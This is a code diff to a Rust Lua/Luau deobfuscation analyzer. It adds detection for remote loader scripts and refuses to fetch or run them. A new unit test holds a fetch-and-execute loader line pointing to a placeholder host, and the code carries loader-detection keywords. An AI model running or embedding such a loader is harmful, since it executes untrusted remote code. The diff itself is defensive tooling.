@@ -94,43 +94,49 @@ fn quote_json_array(values: &[String]) -> String {
 fn analyze_source(source: &str) -> String {
     let (normalized, comments_removed, strings_normalized, long_strings_normalized, mut issues) =
         normalize_source(source);
+    let lower = source.to_ascii_lowercase();
+    let looks_like_loader = lower.contains("loadstring")
+        && (lower.contains("httpget") || lower.contains("request(") || lower.contains("http_request"));
+
+    // A loader is not the protected payload. Never present the loader itself
+    // as a recovered result and never fetch or execute its remote target.
     let mut output = normalized;
     let mut expressions_folded = 0usize;
     let mut static_calls_folded = 0usize;
     let mut locals_propagated = 0usize;
     let mut branches_removed = 0usize;
-    let mut converged = false;
+    let mut converged = looks_like_loader;
 
-    // Deterministic fixed-point passes. This never executes the input.
-    for _ in 0..8 {
-        let before = output.clone();
-        let (next, calls) = fold_static_calls(&output);
-        static_calls_folded += calls;
-        let (next, expressions) = fold_constant_expressions(&next);
-        expressions_folded += expressions;
-        let (next, locals) = propagate_local_constants(&next);
-        locals_propagated += locals;
-        let (next, branches) = simplify_constant_control_flow(&next);
-        branches_removed += branches;
-        output = next;
-        if output == before {
-            converged = true;
-            break;
+    if looks_like_loader {
+        output.clear();
+        issues.push("Loader-only input detected. The remote payload was not fetched or executed; select a local file containing the protected source.".to_string());
+    } else {
+        // Deterministic fixed-point passes. This never executes the input.
+        for _ in 0..8 {
+            let before = output.clone();
+            let (next, calls) = fold_static_calls(&output);
+            static_calls_folded += calls;
+            let (next, expressions) = fold_constant_expressions(&next);
+            expressions_folded += expressions;
+            let (next, locals) = propagate_local_constants(&next);
+            locals_propagated += locals;
+            let (next, branches) = simplify_constant_control_flow(&next);
+            branches_removed += branches;
+            output = next;
+            if output == before {
+                converged = true;
+                break;
+            }
+        }
+
+        if !converged {
+            issues.push("Static passes reached the eight-round safety limit; the output may contain further recoverable expressions.".to_string());
         }
     }
 
-    if !converged {
-        issues.push("Static passes reached the eight-round safety limit; the output may contain further recoverable expressions.".to_string());
-    }
     let (delimiter_ok, delimiter_issues) = check_delimiters(&output);
     issues.extend(delimiter_issues);
     let findings = source_findings(source);
-    let lower = source.to_ascii_lowercase();
-    let looks_like_loader = lower.contains("loadstring")
-        && (lower.contains("httpget") || lower.contains("request(") || lower.contains("http_request"));
-    if looks_like_loader {
-        issues.push("This input appears to be a loader. Network retrieval and script execution are intentionally disabled; provide the downloaded payload as a local file to analyze its contents.".to_string());
-    }
 
     let transformations = expressions_folded + static_calls_folded + locals_propagated + branches_removed;
     let bytes = source.as_bytes().len();
@@ -140,7 +146,9 @@ fn analyze_source(source: &str) -> String {
     } else {
         "Lua/Luau source"
     };
-    let summary = if transformations == 0 {
+    let summary = if looks_like_loader {
+        "Loader detected, but the protected payload is not present in this input. No remote content was fetched and no script was executed.".to_string()
+    } else if transformations == 0 {
         "Analysis completed; no supported static transformation was applicable. The output is not claimed to be deobfuscated."
             .to_string()
     } else {
@@ -1542,6 +1550,17 @@ mod tests {
         let response = analyze_source("while false do\n return 12345\nend\nreturn 7");
         assert!(!response.contains("return 12345"), "dead loop body remains: {}", response);
         assert!(response.contains("return 7"), "live source should be preserved: {}", response);
+    }
+
+    #[test]
+    fn loader_input_is_not_returned_as_recovered_source() {
+        let response = analyze_source(
+            "loadstring(game:HttpGet(\"https://example.invalid/payload\"))()"
+        );
+        assert!(response.contains("\"format\":\"Lua/Luau dynamic loader\""));
+        assert!(response.contains("\"output\":\"\""), "loader should not be shown as recovered source: {}", response);
+        assert!(response.contains("payload is not present"));
+        assert!(response.contains("\"transformations_total\":0"));
     }
 
     #[test]
